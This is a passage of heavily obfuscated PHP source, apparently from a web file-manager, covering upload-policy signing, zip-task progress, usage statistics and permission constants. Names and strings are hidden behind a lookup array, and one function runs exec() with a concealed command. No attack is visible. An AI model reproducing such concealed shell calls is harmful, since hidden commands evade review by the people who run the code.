$ëÎøÓ™Û = gmdate($Ø”ô©ïé[1470], time() + $‚œŸ’ŠÈ); $êº÷“…ö = (string) time() . $Ø”ô©ïé[74] . (string) (time() + $‚œŸ’ŠÈ); $êŸé³·¶ = array($Ø”ô©ïé[263] => $ëÎøÓ™Û, $Ø”ô©ïé[266] => array(array($Ø”ô©ïé[307] => $”Œ©ƒ¦), array($Ø”ô©ïé[267] => $this->bucket), array($Ø”ô©ïé[268], $Ø”ô©ïé[269], $Ø”ô©ïé[12]), array($Ø”ô©ïé[271] => $Òãµ½ª), array($Ø”ô©ïé[1471] => $·«ƒ„±), array($Ø”ô©ïé[1472] => $this->accessKey), array($Ø”ô©ïé[1473] => $êº÷“…ö))); $êŸé³·¶ = json_encode($êŸé³·¶); $ÓóßÒè˜ = hash_hmac($Ø”ô©ïé[1469], $êº÷“…ö, $this->secret); $ööŸÍôµ = sha1($êŸé³·¶); $å¶”±Ë = hash_hmac($Ø”ô©ïé[1469], $ööŸÍôµ, $ÓóßÒè˜); $±æ™¨À = array($Ø”ô©ïé[307] => $”Œ©ƒ¦, $Ø”ô©ïé[271] => $Òãµ½ª, $Ø”ô©ïé[278] => base64_encode($êŸé³·¶), $Ø”ô©ïé[1471] => $·«ƒ„±, $Ø”ô©ïé[1472] => $this->accessKey, $Ø”ô©ïé[1474] => $êº÷“…ö, $Ø”ô©ïé[1475] => $å¶”±Ë, $Ø”ô©ïé[207] => $this->getHost()); return $±æ™¨À; } public function fileOutImage($Ôò¼Û¡, $à¬¨ÆüÎ = 250) { $ø£‡Ÿ–’ =& $_SERVER[öæÛ¿©¿]; if ($this->size($Ôò¼Û¡) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Ôò¼Û¡, $à¬¨ÆüÎ); } $€®š§ì = $this->link($Ôò¼Û¡); $€®š§ì .= $ø£‡Ÿ–’[1476] . $à¬¨ÆüÎ . $ø£‡Ÿ–’[1477]; $this->fileOutLink($€®š§ì); } } goto D–Ş¡Ğ²„; dÀ×š˜êÊš: class TaskZip extends TaskFileTransfer { protected function startAfter() { $”¾èÖü =& $_SERVER[öæÛ¿©¿]; parent::startAfter(); Hook::bind($”¾èÖü[2060], array($this, $”¾èÖü[2050])); Hook::bind($”¾èÖü[2052], array($this, $”¾èÖü[2053])); $•Å™ïÒç =& $this->task; $•Å™ïÒç[$”¾èÖü[2054]] = $”¾èÖü[1327]; if (!$•Å™ïÒç[$”¾èÖü[1813]]) { $•Å™ïÒç[$”¾èÖü[1813]] = LNG($”¾èÖü[2061]); } } protected function endAfter() { $èÎì¸ºÆ =& $_SERVER[öæÛ¿©¿]; parent::endAfter(); Hook::unbind($èÎì¸ºÆ[2060], array($this, $èÎì¸ºÆ[2050])); Hook::unbind($èÎì¸ºÆ[2052], array($this, $èÎì¸ºÆ[2053])); } public function updateAfter() { $ˆæ¾ı„„ =& $_SERVER[öæÛ¿©¿]; $ÈÖ»¬í =& $this->task; if (!$ÈÖ»¬í[$ˆæ¾ı„„[1174]] || !$ÈÖ»¬í[$ˆæ¾ı„„[856]]) { return; } if ($ÈÖ»¬í[$ˆæ¾ı„„[2054]] == $ˆæ¾ı„„[1327]) { $ŞĞ·ÙùÇ = $ÈÖ»¬í[$ˆæ¾ı„„[1979]]; if ($ÈÖ»¬í[$ˆæ¾ı„„[1980]] != $ˆæ¾ı„„[1327]) { $ŞĞ·ÙùÇ = 0; } $½‘¤ãîÛ = ($ÈÖ»¬í[$ˆæ¾ı„„[1983]] + $ŞĞ·ÙùÇ) / $ÈÖ»¬í[$ˆæ¾ı„„[856]]; $ÈÖ»¬í[$ˆæ¾ı„„[1926]] = $½‘¤ãîÛ * 0.3; } else { if ($ÈÖ»¬í[$ˆæ¾ı„„[2054]] == $ˆæ¾ı„„[389]) { $½‘¤ãîÛ = $ÈÖ»¬í[$ˆæ¾ı„„[1925]] / $ÈÖ»¬í[$ˆæ¾ı„„[1174]]; $ÈÖ»¬í[$ˆæ¾ı„„[1926]] = 0.3 + $½‘¤ãîÛ * 0.5; } else { if ($ÈÖ»¬í[$ˆæ¾ı„„[2054]] == $ˆæ¾ı„„[108]) { $½‘¤ãîÛ = 0; if ($ÈÖ»¬í[$ˆæ¾ı„„[1978]]) { $½‘¤ãîÛ = $ÈÖ»¬í[$ˆæ¾ı„„[1979]] / $ÈÖ»¬í[$ˆæ¾ı„„[1978]]; } $ÈÖ»¬í[$ˆæ¾ı„„[1926]] = 0.3 + 0.5 + $½‘¤ãîÛ * 0.2; } } } if ($ÈÖ»¬í[$ˆæ¾ı„„[1926]] > 0) { $è×”ÎÀ¸ = timeFloat() - $ÈÖ»¬í[$ˆæ¾ı„„[1928]] - $ÈÖ»¬í[$ˆæ¾ı„„[1931]]; $ÈÖ»¬í[$ˆæ¾ı„„[1932]] = $è×”ÎÀ¸ * (1 - $ÈÖ»¬í[$ˆæ¾ı„„[1926]]) / $ÈÖ»¬í[$ˆæ¾ı„„[1926]]; } } public function copyFileStart($…üæ²¯Ï, $ÖûÑóå, $ƒÖõÏ¢Î, $ÆÀìö¹, $Ğìì×”ò, $¨§ÉúŞù) { $áë‚âîà =& $_SERVER[öæÛ¿©¿]; parent::copyFileStart($…üæ²¯Ï, $ÖûÑóå, $ƒÖõÏ¢Î, $ÆÀìö¹, $Ğìì×”ò, $¨§ÉúŞù); $Êå¥–™  =& $this->task; if ($Êå¥–™ [$áë‚âîà[2054]] == $áë‚âîà[389]) { $Êå¥–™ [$áë‚âîà[2054]] = $áë‚âîà[108]; } $this->update(); } public function copyFileEnd($ñğĞÛÆ, $†µ¶©Åî, $¨†‚à, $‚€Úı„ô, $°Ôëûñ™, $¸ŠÕÔ¡ó) { $ı¦Ï¹‡Š =& $_SERVER[öæÛ¿©¿]; $“ÁùÃ =& $this->task; $“ÁùÃ[$ı¦Ï¹‡Š[1979]] = $“ÁùÃ[$ı¦Ï¹‡Š[1978]]; $“ÁùÃ[$ı¦Ï¹‡Š[1983]] += $“ÁùÃ[$ı¦Ï¹‡Š[1978]]; $“ÁùÃ[$ı¦Ï¹‡Š[1980]] = $ı¦Ï¹‡Š[12]; $this->update(); } public function zipEvent($µé°¶ˆÊ, $Ã×•”ç, $ğ±òÄš, $¤‚šÄµ) { $Û¡õ›² =& $_SERVER[öæÛ¿©¿]; $À‡›½§¨ =& $this->task; $À‡›½§¨[$Û¡õ›²[1976]] = get_path_this($Ã×•”ç); $À‡›½§¨[$Û¡õ›²[1978]] = $¤‚šÄµ; $À‡›½§¨[$Û¡õ›²[1979]] = $ğ±òÄš; $À‡›½§¨[$Û¡õ›²[1176]] = $µé°¶ˆÊ == $Û¡õ›²[2062] ? $Û¡õ›²[2057] : $Û¡õ›²[2058]; $À‡›½§¨[$Û¡õ›²[1980]] = $Û¡õ›²[12]; $À‡›½§¨[$Û¡õ›²[856]] = $¤‚šÄµ; $À‡›½§¨[$Û¡õ›²[2054]] = $Û¡õ›²[389]; $this->update(); } public function nameParse($êÌÒ¯ŞÛ) { $Ú©‰Ä’½ =& $_SERVER[öæÛ¿©¿]; $Åí¦—ìı =& $this->task; if ($Åí¦—ìı[$Ú©‰Ä’½[1925]] < $Åí¦—ìı[$Ú©‰Ä’½[1174]]) { $ÊÎéóÎ³ = get_path_this($êÌÒ¯ŞÛ); if (strstr($ÊÎéóÎ³, $Ú©‰Ä’½[10])) { $Åí¦—ìı[$Ú©‰Ä’½[1925]] += 1; } } if ($Åí¦—ìı[$Ú©‰Ä’½[2054]] == $Ú©‰Ä’½[1327]) { $Åí¦—ìı[$Ú©‰Ä’½[2054]] = $Ú©‰Ä’½[389]; } $Åí¦—ìı[$Ú©‰Ä’½[1976]] = $êÌÒ¯ŞÛ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¥öÆ¥¬û) { $©îõ¹³ê =& $_SERVER[öæÛ¿©¿]; $º€ÑÄÂ¨ = array($©îõ¹³ê[681] => array($©îõ¹³ê[33] => $©îõ¹³ê[2063], $©îõ¹³ê[352] => array($©îõ¹³ê[283], $©îõ¹³ê[858], $©îõ¹³ê[2064], $©îõ¹³ê[2065])), $©îõ¹³ê[2066] => array($©îõ¹³ê[33] => $©îõ¹³ê[2067], $©îõ¹³ê[352] => array($©îõ¹³ê[283], $©îõ¹³ê[856], $©îõ¹³ê[2068], $©îõ¹³ê[2069], $©îõ¹³ê[2070]))); if (!isset($º€ÑÄÂ¨[$¥öÆ¥¬û])) { return !1; } $this->optionType = $º€ÑÄÂ¨[$¥öÆ¥¬û][$©îõ¹³ê[33]]; $this->field = $º€ÑÄÂ¨[$¥öÆ¥¬û][$©îõ¹³ê[352]]; return !0; } public function listData($ç´Í„òï = false, $ˆ®óŸ…ö = "\x6d\x6f\144\x69\146\171\124\x69\x6d\145", $ş¼›¨èœ = false) { return parent::listData($ç´Í„òï, $ˆ®óŸ…ö, $ş¼›¨èœ); } public function trendList($¼¨¹÷ˆš) { $ ¹öúà =& $_SERVER[öæÛ¿©¿]; $‚×ê©±· = $this->listData(); if ($‚×ê©±·) { $€¨È¬×§ = end($‚×ê©±·); $¹ö¶Şš” = date($ ¹öúà[2071], strtotime($ ¹öúà[2072])); if ($€¨È¬×§[$ ¹öúà[283]] == $¹ö¶Şš”) { return $‚×ê©±·; } $µ®Ş§†¶ = strtotime($€¨È¬×§[$ ¹öúà[283]]); } if (!isset($µ®Ş§†¶)) { $ğƒƒĞÇ = $¼¨¹÷ˆš == $ ¹öúà[681] ? $ ¹öúà[613] : $ ¹öúà[925]; $µ®Ş§†¶ = Model($ğƒƒĞÇ)->min($ ¹öúà[232]); } $¶¹øÖßÖ = $ ¹öúà[2073] . ucfirst($¼¨¹÷ˆš); $ÓÖˆÕ²º = $this->dateList($µ®Ş§†¶); foreach ($ÓÖˆÕ²º as $¹ö¶Şš”) { $this->{$¶¹øÖßÖ}($¹ö¶Şš”); } return $this->listData(); } private function dateList($ˆ…›¿İ) { $ê‹¤† =& $_SERVER[öæÛ¿©¿]; $ªÁ®ÅˆÀ = $ˆ…›¿İ; $ä¸ •‡¦ = strtotime($ê‹¤†[2072]); $¬¬šïÊÑ = array(); while ($ªÁ®ÅˆÀ <= $ä¸ •‡¦) { $¬¬šïÊÑ[] = date($ê‹¤†[2071], $ªÁ®ÅˆÀ); $ªÁ®ÅˆÀ = strtotime($ê‹¤†[2074], $ªÁ®ÅˆÀ); } return $¬¬šïÊÑ; } public function _recordUser($°ìê–‡Ã = '') { $çš£¶¡Ì =& $_SERVER[öæÛ¿©¿]; $ÙÅãëğ‡ = strtotime(date($çš£¶¡Ì[2075], strtotime($°ìê–‡Ã))); $Úƒ¢æà÷ = strtotime(date($çš£¶¡Ì[2076], strtotime($°ìê–‡Ã))); $œ´èĞïÌ = array($çš£¶¡Ì[232] => array($çš£¶¡Ì[1125], $Úƒ¢æà÷)); $¹‡ÇÇÃÛ = Model($çš£¶¡Ì[613])->where($œ´èĞïÌ)->count($çš£¶¡Ì[1538]); $œ´èĞïÌ[$çš£¶¡Ì[232]] = array($çš£¶¡Ì[409], array($ÙÅãëğ‡, $Úƒ¢æà÷)); $‡åÀÃ¢´ = Model($çš£¶¡Ì[613])->where($œ´èĞïÌ)->count($çš£¶¡Ì[1538]); $œ´èĞïÌ[$çš£¶¡Ì[33]] = $çš£¶¡Ì[2077]; $ÕÚá¯¦® = Model($çš£¶¡Ì[2078])->where($œ´èĞïÌ)->count($çš£¶¡Ì[2079]); $ÛÒäôâ® = array($çš£¶¡Ì[283] => $°ìê–‡Ã, $çš£¶¡Ì[858] => (int) $¹‡ÇÇÃÛ, $çš£¶¡Ì[2064] => (int) $‡åÀÃ¢´, $çš£¶¡Ì[2065] => (int) $ÕÚá¯¦®); return $this->insert($ÛÒäôâ®); } public function _recordStore($éÕ¾Ç÷± = '') { $×ÚŸïë• =& $_SERVER[öæÛ¿©¿]; $ÍÍ’”§ = strtotime(date($×ÚŸïë•[2076], strtotime($éÕ¾Ç÷±))); $ÚŠÑ²ãŠ = array($×ÚŸïë•[232] => array($×ÚŸïë•[1125], $ÍÍ’”§)); $„“æëâŒ = Model($×ÚŸïë•[556])->where($ÚŠÑ²ãŠ)->sum($×ÚŸïë•[79]); $ÚŠÑ²ãŠ[$×ÚŸïë•[496]] = 0; $«ÆôÈÔÄ = Model($×ÚŸïë•[925])->where($ÚŠÑ²ãŠ)->sum($×ÚŸïë•[79]); $ÚŠÑ²ãŠ[$×ÚŸïë•[189]] = 1; $ƒê¨ª“® = Model($×ÚŸïë•[925])->where($ÚŠÑ²ãŠ)->sum($×ÚŸïë•[79]); $ÚŠÑ²ãŠ[$×ÚŸïë•[189]] = 2; $ùä®–ø = Model($×ÚŸïë•[925])->where($ÚŠÑ²ãŠ)->sum($×ÚŸïë•[79]); $ÃüµşÚ† = array($×ÚŸïë•[283] => $éÕ¾Ç÷±, $×ÚŸïë•[856] => (int) $«ÆôÈÔÄ, $×ÚŸïë•[2068] => (int) $„“æëâŒ, $×ÚŸïë•[2069] => (int) $ƒê¨ª“®, $×ÚŸïë•[2070] => (int) $ùä®–ø); return $this->insert($ÃüµşÚ†); } public function trend($ÒÂÜüÛ, $äçÂè™Ï) { $ ÁÀ“ =& $_SERVER[öæÛ¿©¿]; if (!$this->init($ÒÂÜüÛ)) { return !1; } $ ¶şÔİ = $this->trendList($ÒÂÜüÛ); if ($ ¶şÔİ && $äçÂè™Ï != $ ÁÀ“[1898]) { $›ÜğŠÆ = $ ¶şÔİ[0][$ ÁÀ“[283]]; $É›ÑøÑ‚ = $this->validDate($äçÂè™Ï, $›ÜğŠÆ); $ù˜‡ù° = array(); $× ®·ßø = array_to_keyvalue($ ¶şÔİ, $ ÁÀ“[283]); foreach ($É›ÑøÑ‚ as $Ó±¤”¡) { if (isset($× ®·ßø[$Ó±¤”¡])) { $ú‡ìİÀâ = $× ®·ßø[$Ó±¤”¡]; } else { $ú‡ìİÀâ = end($ ¶şÔİ); $ú‡ìİÀâ[$ ÁÀ“[283]] = $Ó±¤”¡; if ($ÒÂÜüÛ == $ ÁÀ“[681]) { $ú‡ìİÀâ[$ ÁÀ“[2064]] = $ú‡ìİÀâ[$ ÁÀ“[2065]] = 0; } } $ù˜‡ù°[] = $ú‡ìİÀâ; } $ ¶şÔİ = $ù˜‡ù°; } $»öâåõ£ = array($ ÁÀ“[681] => array($ ÁÀ“[858] => LNG($ ÁÀ“[2080]), $ ÁÀ“[2064] => LNG($ ÁÀ“[2081]), $ ÁÀ“[2065] => LNG($ ÁÀ“[2082])), $ ÁÀ“[2066] => array($ ÁÀ“[856] => LNG($ ÁÀ“[2083]), $ ÁÀ“[2068] => LNG($ ÁÀ“[2084]), $ ÁÀ“[2069] => LNG($ ÁÀ“[2085]), $ ÁÀ“[2070] => LNG($ ÁÀ“[2086]))); $—‘ŸÍèÄ = array($ ÁÀ“[681] => $ ÁÀ“[2087], $ ÁÀ“[2066] => $ ÁÀ“[79]); if (empty($ ¶şÔİ)) { $Ó±¤”¡ = date($ ÁÀ“[2071], strtotime($ ÁÀ“[2072])); $–ÃÏµ‘Û = array($ ÁÀ“[283] => $Ó±¤”¡); foreach ($»öâåõ£[$ÒÂÜüÛ] as $… ïÉ × => $ß‘úıï•) { $–ÃÏµ‘Û[$… ïÉ ×] = 0; } $ ¶şÔİ[] = $–ÃÏµ‘Û; } $Û³ÌûÓ‡ = array(); foreach ($ ¶şÔİ as $ß‘úıï•) { if ($ÒÂÜüÛ == $ ÁÀ“[2066] && $ß‘úıï•[$ ÁÀ“[2068]] > $ß‘úıï•[$ ÁÀ“[856]]) { $ß‘úıï•[$ ÁÀ“[2068]] = $ß‘úıï•[$ ÁÀ“[856]]; } foreach ($»öâåõ£[$ÒÂÜüÛ] as $… ïÉ × => $û˜ÎµÛà) { $ú‡ìİÀâ = array($ ÁÀ“[283] => $ß‘úıï•[$ ÁÀ“[283]], $ ÁÀ“[1813] => $û˜ÎµÛà); $ú‡ìİÀâ[$—‘ŸÍèÄ[$ÒÂÜüÛ]] = isset($ß‘úıï•[$… ïÉ ×]) ? $ß‘úıï•[$… ïÉ ×] : 0; $Û³ÌûÓ‡[] = $ú‡ìİÀâ; } } return $Û³ÌûÓ‡; } public function validDate($¹õ›À€Ú, $™õÂ‹ãı) { $º–â¢÷¯ =& $_SERVER[öæÛ¿©¿]; $¶Ä¯íöÀ = date($º–â¢÷¯[2071], strtotime($º–â¢÷¯[2072])); $ÛŞ§•¶£ = array($¶Ä¯íöÀ); switch ($¹õ›À€Ú) { case $º–â¢÷¯[1905]: $¸ŞÌÓÃŞ = mktime(0, 0, 0, date($º–â¢÷¯[2088]), date($º–â¢÷¯[1604]) - date($º–â¢÷¯[1690]) + 7 - 7, date($º–â¢÷¯[2089])); $¨ªì¼ÇÓ = 0; do { $òÛÄ¸¥® = date($º–â¢÷¯[2071], $¸ŞÌÓÃŞ - 3600 * 24 * 7 * $¨ªì¼ÇÓ); $ÛŞ§•¶£[] = $òÛÄ¸¥®; $¨ªì¼ÇÓ++; } while ($™õÂ‹ãı < $òÛÄ¸¥®); break; case $º–â¢÷¯[1903]: $¨ªì¼ÇÓ = 1; do { $ˆ…âªäë = date($º–â¢÷¯[2090], strtotime("\x2d\x20{$¨ªì¼ÇÓ}\x20\x6d\x6f\156\x74\150\x73")); $ÛŞ§•¶£[] = $ˆ…âªäë; $¨ªì¼ÇÓ++; } while ($™õÂ‹ãı < $ˆ…âªäë); break; case $º–â¢÷¯[2091]: $·«ÓãÍ = (int) date($º–â¢÷¯[2089], strtotime($™õÂ‹ãı)); $§îû‘º‹ = (int) date($º–â¢÷¯[2089]); if ($·«ÓãÍ >= $§îû‘º‹) { break; } for ($·«ÓãÍ; $·«ÓãÍ < $§îû‘º‹; $·«ÓãÍ++) { $ÛŞ§•¶£[] = $·«ÓãÍ . $º–â¢÷¯[2092]; } break; default: break; } if ($™õÂ‹ãı > end($ÛŞ§•¶£)) { array_pop($ÛŞ§•¶£); } sort($ÛŞ§•¶£); return $ÛŞ§•¶£; } public function listTable($Æ‰Öû”ò) { $Üõú¤ˆ = ucfirst($Æ‰Öû”ò); return Model($Üõú¤ˆ)->listData(); } public function option($€ÂºÖ‹¢) { return call_user_func_array(array($this, $_SERVER[öæÛ¿©¿][2093] . ucfirst($€ÂºÖ‹¢)), array()); } private function optionUser() { $ÔÛ¹Ûìô =& $_SERVER[öæÛ¿©¿]; $ÊÜÜ°½ = Model($ÔÛ¹Ûìô[613])->count($ÔÛ¹Ûìô[1538]); $É†š£ÉÈ = Model($ÔÛ¹Ûìô[613])->where($ÔÛ¹Ûìô[2094])->count($ÔÛ¹Ûìô[1538]); $””ò€— = intval($GLOBALS[$ÔÛ¹Ûìô[6]][$ÔÛ¹Ûìô[425]][$ÔÛ¹Ûìô[1871]]) / 3600; $â´©íà  = strtotime("\55{$””ò€—}\40\150\157\165\x72\x73"); $“å”Õ“§ = strtotime(date($ÔÛ¹Ûìô[2075])); if ($â´©íà  < $“å”Õ“§) { $â´©íà  = $“å”Õ“§; } $»µ¨€è‰ = array($ÔÛ¹Ûìô[2095] => array($ÔÛ¹Ûìô[1126], $â´©íà )); $íÈî¬È = (int) Model($ÔÛ¹Ûìô[613])->where($»µ¨€è‰)->count($ÔÛ¹Ûìô[1538]); if (!$íÈî¬È) { $íÈî¬È = 1; } $»µ¨€è‰ = array($ÔÛ¹Ûìô[2095] => array($ÔÛ¹Ûìô[1126], $“å”Õ“§)); $»ÀÖ¨Å‚ = Model($ÔÛ¹Ûìô[613])->where($»µ¨€è‰)->count($ÔÛ¹Ûìô[1538]); return array($ÔÛ¹Ûìô[851] => (int) $ÊÜÜ°½, $ÔÛ¹Ûìô[2096] => (int) ($ÊÜÜ°½ - $É†š£ÉÈ), $ÔÛ¹Ûìô[2097] => (int) $É†š£ÉÈ, $ÔÛ¹Ûìô[2098] => (int) $»ÀÖ¨Å‚, $ÔÛ¹Ûìô[2099] => $íÈî¬È); } private function optionFile() { $ú««£óÏ =& $_SERVER[öæÛ¿©¿]; $ÁâºæŒù = $this->sourceSize(); $ÀËÅ’Å¯ = $ÁâºæŒù[$ú««£óÏ[79]]; $êú±Œ§¢ = $ÁâºæŒù[$ú««£óÏ[2068]]; $Ú¼ÁÁƒö = Model($ú««£óÏ[925])->where(array($ú««£óÏ[496] => 0))->count($ú««£óÏ[192]); $Ò–ãÁ²Ë = array($ú««£óÏ[496] => 0, $ú««£óÏ[232] => array($ú««£óÏ[1126], strtotime(date($ú««£óÏ[2075])))); $¨èûˆ’ = Model($ú««£óÏ[925])->where($Ò–ãÁ²Ë)->sum($ú««£óÏ[79]); $âáÔŸÔğ = Model($ú««£óÏ[925])->where($Ò–ãÁ²Ë)->count($ú««£óÏ[192]); return array($ú««£óÏ[856] => $ÀËÅ’Å¯, $ú««£óÏ[2068] => $êú±Œ§¢, $ú««£óÏ[2100] => $ÀËÅ’Å¯ - $êú±Œ§¢, $ú««£óÏ[2101] => (int) $¨èûˆ’, $ú««£óÏ[858] => (int) $Ú¼ÁÁƒö, $ú««£óÏ[2102] => (int) $âáÔŸÔğ); } private function optionAccess() { $Öï–åÃ¯ =& $_SERVER[öæÛ¿©¿]; return array($Öï–åÃ¯[851] => $this->typeLogCnt(), $Öï–åÃ¯[108] => $this->typeLogCnt($Öï–åÃ¯[108]), $Öï–åÃ¯[535] => $this->typeLogCnt($Öï–åÃ¯[535]), $Öï–åÃ¯[1276] => $this->typeLogCnt($Öï–åÃ¯[1276]), $Öï–åÃ¯[1507] => $this->typeLogCnt($Öï–åÃ¯[1507]), $Öï–åÃ¯[681] => $this->typeLogCnt($Öï–åÃ¯[12], $Öï–åÃ¯[2079])); } private function typeLogCnt($´ŸøÓğ– = '', $·¤’ÁúÄ = "\x69\144") { $ùŸ·Ã† =& $_SERVER[öæÛ¿©¿]; $¿üõäÅ“ = array($ùŸ·Ã†[108] => array($ùŸ·Ã†[2103], $ùŸ·Ã†[2104]), $ùŸ·Ã†[535] => array($ùŸ·Ã†[2105], $ùŸ·Ã†[2106]), $ùŸ·Ã†[1276] => array($ùŸ·Ã†[2107], $ùŸ·Ã†[2108], $ùŸ·Ã†[2109]), $ùŸ·Ã†[1507] => array($ùŸ·Ã†[2110], $ùŸ·Ã†[2111]), $ùŸ·Ã†[1508] => array($ùŸ·Ã†[2112], $ùŸ·Ã†[2113], $ùŸ·Ã†[2114])); $ÎÅ›À˜ = strtotime(date($ùŸ·Ã†[2075])); $úŠÑÆƒû = array($ùŸ·Ã†[232] => array($ùŸ·Ã†[1126], $ÎÅ›À˜)); if ($´ŸøÓğ–) { $úŠÑÆƒû[$ùŸ·Ã†[33]] = array($ùŸ·Ã†[7], $¿üõäÅ“[$´ŸøÓğ–]); } $¾Ğë×¡ = Model($ùŸ·Ã†[2078])->where($úŠÑÆƒû)->count($·¤’ÁúÄ); return (int) $¾Ğë×¡; } private function optionServer() { $õÇ€ÌÙê =& $_SERVER[öæÛ¿©¿]; $ºú¿™ = $this->diskDriver(); $ú»Ÿ¡ë = KodIO::defaultDriver(); $ÀÓæ¼Ï = array($õÇ€ÌÙê[918] => $ú»Ÿ¡ë[$õÇ€ÌÙê[483]]); $Öø—›ó£ = Model($õÇ€ÌÙê[556])->where($ÀÓæ¼Ï)->sum($õÇ€ÌÙê[79]); $»ç¼ìı­ = explode($õÇ€ÌÙê[53], $_SERVER[$õÇ€ÌÙê[145]]); $ø¥•ôŞê = $»ç¼ìı­[0]; $Ñİüúö = $GLOBALS[$õÇ€ÌÙê[6]][$õÇ€ÌÙê[21]]; $­çô = $Ñİüúö[$õÇ€ÌÙê[1088]]; if ($­çô == $õÇ€ÌÙê[1076]) { $Ø¤â¡ÚÙ = explode($õÇ€ÌÙê[1418], $Ñİüúö[$õÇ€ÌÙê[1087]]); $­çô = $Ø¤â¡ÚÙ[0]; } if ($­çô == $õÇ€ÌÙê[1024] || $­çô == $õÇ€ÌÙê[896]) { $¡Ê½ŠöÛ = Model()->db()->query($õÇ€ÌÙê[2115]); $«™¶±Ü = $¡Ê½ŠöÛ[0] && isset($¡Ê½ŠöÛ[0][$õÇ€ÌÙê[1812]]) ? $¡Ê½ŠöÛ[0][$õÇ€ÌÙê[1812]] : 0; $­çô = $õÇ€ÌÙê[2116] . ($«™¶±Ü ? $õÇ€ÌÙê[8] . $«™¶±Ü : $õÇ€ÌÙê[12]); } $×àÔâ¿ù = $GLOBALS[$õÇ€ÌÙê[6]][$õÇ€ÌÙê[425]][$õÇ€ÌÙê[927]]; return array($õÇ€ÌÙê[2117] => $ºú¿™ ? $ºú¿™[$õÇ€ÌÙê[2118]] : 0, $õÇ€ÌÙê[2119] => $ºú¿™ ? $ºú¿™[$õÇ€ÌÙê[2120]] : 0, $õÇ€ÌÙê[2121] => (int) $ú»Ÿ¡ë[$õÇ€ÌÙê[2118]] * 1024 * 1024 * 1024, $õÇ€ÌÙê[2122] => (int) $Öø—›ó£, $õÇ€ÌÙê[2123] => ucfirst($ø¥•ôŞê), $õÇ€ÌÙê[2124] => $õÇ€ÌÙê[2125] . PHP_VERSION, $õÇ€ÌÙê[2126] => phpBuild64() ? 64 : 32, $õÇ€ÌÙê[850] => str_replace($õÇ€ÌÙê[1250], $õÇ€ÌÙê[1104], $­çô), $õÇ€ÌÙê[425] => ucfirst($×àÔâ¿ù), $õÇ€ÌÙê[32] => $_SERVER[$õÇ€ÌÙê[2127]]); } private function diskDriver() { $êê±ÈŸŞ =& $_SERVER[öæÛ¿©¿]; $ôÊ¨¥ÎÖ = $êê±ÈŸŞ[8]; $«¡é¹Ü¥ = $GLOBALS[$êê±ÈŸŞ[6]][$êê±ÈŸŞ[1442]] == $êê±ÈŸŞ[1443]; if ($«¡é¹Ü¥) { $ôÊ¨¥ÎÖ = $êê±ÈŸŞ[2128]; if (function_exists($êê±ÈŸŞ[2129])) { exec($êê±ÈŸŞ[2130], $Ç˜Ù’ ); $ôÊ¨¥ÎÖ = $Ç˜Ù’ [1] . $êê±ÈŸŞ[8]; } } if (!file_exists($ôÊ¨¥ÎÖ)) { return; } if (!function_exists($êê±ÈŸŞ[2131])) { return; } $„œ®Æ¶ = @disk_total_space($ôÊ¨¥ÎÖ); $ÑæøÀò = $„œ®Æ¶ - @disk_free_space($ôÊ¨¥ÎÖ); return array($êê±ÈŸŞ[2118] => $„œ®Æ¶, $êê±ÈŸŞ[2120] => $ÑæøÀò); } public function fileChart($ÉÏŠ§¢û) { $ûæÂÃõè =& $_SERVER[öæÛ¿©¿]; if (isset($ÉÏŠ§¢û[$ûæÂÃõè[1538]])) { return Model($ûæÂÃõè[925])->userFileTypeProfile($ÉÏŠ§¢û[$ûæÂÃõè[1538]]); } if (isset($ÉÏŠ§¢û[$ûæÂÃõè[1440]])) { return Model($ûæÂÃõè[925])->groupFileTypeProfile($ÉÏŠ§¢û[$ûæÂÃõè[1440]]); } $õ¹‹­×Ÿ = $this->sourceSize(); $Ôéš‰Æ = array($ûæÂÃõè[191] => 0, $ûæÂÃõè[189] => 1); $ŠùÆ®Ä = Model($ûæÂÃõè[925])->where($Ôéš‰Æ)->sum($ûæÂÃõè[79]); $Ôéš‰Æ[$ûæÂÃõè[189]] = 2; $ùˆôä©ô = Model($ûæÂÃõè[925])->where($Ôéš‰Æ)->sum($ûæÂÃõè[79]); return array($ûæÂÃõè[856] => $õ¹‹­×Ÿ[$ûæÂÃõè[79]], $ûæÂÃõè[2068] => $õ¹‹­×Ÿ[$ûæÂÃõè[2068]], $ûæÂÃõè[2069] => (int) $ŠùÆ®Ä, $ûæÂÃõè[2070] => (int) $ùˆôä©ô); } private function sourceSize() { $Ÿ…™–‰ =& $_SERVER[öæÛ¿©¿]; $µ‹ßÒÑ = Model($Ÿ…™–‰[925])->where(array($Ÿ…™–‰[496] => 0))->sum($Ÿ…™–‰[79]); $¯ÌÑ£‰ = Model($Ÿ…™–‰[556])->sum($Ÿ…™–‰[79]); if ($¯ÌÑ£‰ > $µ‹ßÒÑ) { $¯ÌÑ£‰ = $µ‹ßÒÑ; } return array($Ÿ…™–‰[79] => (int) $µ‹ßÒÑ, $Ÿ…™–‰[2068] => (int) $¯ÌÑ£‰); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ñ‡Øí¥ =& $_SERVER[öæÛ¿©¿]; $ó¬ğˆ€Ï = array(array($Ñ‡Øí¥[505] => LNG($Ñ‡Øí¥[2132]), $Ñ‡Øí¥[2133] => $Ñ‡Øí¥[2134], $Ñ‡Øí¥[2135] => 1, $Ñ‡Øí¥[2136] => 1, $Ñ‡Øí¥[2137] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ñ‡Øí¥[505] => LNG($Ñ‡Øí¥[2138]), $Ñ‡Øí¥[2133] => $Ñ‡Øí¥[2139], $Ñ‡Øí¥[2135] => 2, $Ñ‡Øí¥[2136] => 1, $Ñ‡Øí¥[2137] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | 